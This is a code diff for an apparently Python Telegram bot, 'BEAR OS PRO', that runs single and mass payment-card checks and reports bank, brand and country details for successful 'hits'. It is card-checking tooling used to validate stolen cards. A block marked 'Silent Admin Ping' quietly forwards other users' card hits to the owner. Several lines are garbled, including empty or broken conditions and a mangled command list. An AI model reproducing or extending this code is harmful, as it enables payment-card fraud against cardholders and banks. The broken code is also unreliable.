@@ -352,6 +352,7 @@ async def process_checker(message: Message, text: str, checker: str):
     start_time = time.time()
     username = message.from_user.username or message.from_user.first_name
     
+    # 1. SETUP INITIAL MESSAGE
     if is_mass:
         init_text = format_summary("STARTING...", checker, total_cards, app, dec, err, start_time, tier, username)
         kb = generate_stats_keyboard(app, dec, err, start_time)
@@ -359,6 +360,7 @@ async def process_checker(message: Message, text: str, checker: str):
     else:
         msg = await message.answer(f"⏳ <b>Initializing {checker}...</b>")
 
+    # 2. RUN THE CHECKER LOOP
     async with aiohttp.ClientSession() as session:
         for idx, cc in enumerate(ccs, 1):
             parts = parse_cc_string(cc)
@@ -396,6 +398,7 @@ async def process_checker(message: Message, text: str, checker: str):
             
             elapsed = time.time() - start_time
             
+            # --- 3. HANDLE SINGLE HIT OUTPUT ---
             if status in or not is_mass:
                 hit_text = format_single_hit(status, checker, resp, cc, country, flag, bank, brand, c_type, elapsed, tier, username)
                 
@@ -406,12 +409,14 @@ async def process_checker(message: Message, text: str, checker: str):
                     if status in:
                         await message.answer(hit_text)
                         
+                # Silent Admin Ping
                 if status in:
                     owner = ADMIN_IDS if ADMIN_IDS else None
                     if owner and str(user_id)!= owner:
                         try: await bot.send_message(owner, f"🔥 <b>NEW HIT</b>\n{hit_text}")
                         except: pass
             
+            # --- 4. HANDLE MASS CHECK UI UPDATES ---
             if is_mass:
                 if (idx % 3 == 0) or idx == total_cards:
                     header = "CHECKING" if idx < total_cards else "COMPLETE"
@@ -477,15 +482,19 @@ async def cmd_mpp(message: Message, command: CommandObject, state: FSMContext):
 
 # --- COMMAND MENU SETUP ---
 async def setup_bot_commands(bot: Bot):
+    # These are the commands EVERYONE will see
     user_commands =
     
+    # These are the commands ONLY YOU will see
     admin_commands = user_commands + Generate keys"),
         BotCommand(command="broadcast", description=" Message all users"),
         BotCommand(command="users", description=" View bot stats"),
     ]
     
+    # 1. Set default for everyone
     await bot.set_my_commands(user_commands, scope=BotCommandScopeAllPrivateChats())
     
+    # 2. Push hidden commands only to admins
     for admin_id in ADMIN_IDS:
         try:
             await bot.set_my_commands(admin_commands, scope=BotCommandScopeChat(chat_id=int(admin_id)))
@@ -494,7 +503,7 @@ async def setup_bot_commands(bot: Bot):
 
 # --- MAIN DEPLOYMENT ---
 async def main():
-    print("BEAR OS PRO DEPLOYED - CHECKER ONLY MODE (SYNTAX FIXED)")
+    print("BEAR OS PRO DEPLOYED - SYNTAX FULLY FIXED")
     await setup_bot_commands(bot)
     await dp.start_polling(bot)
 
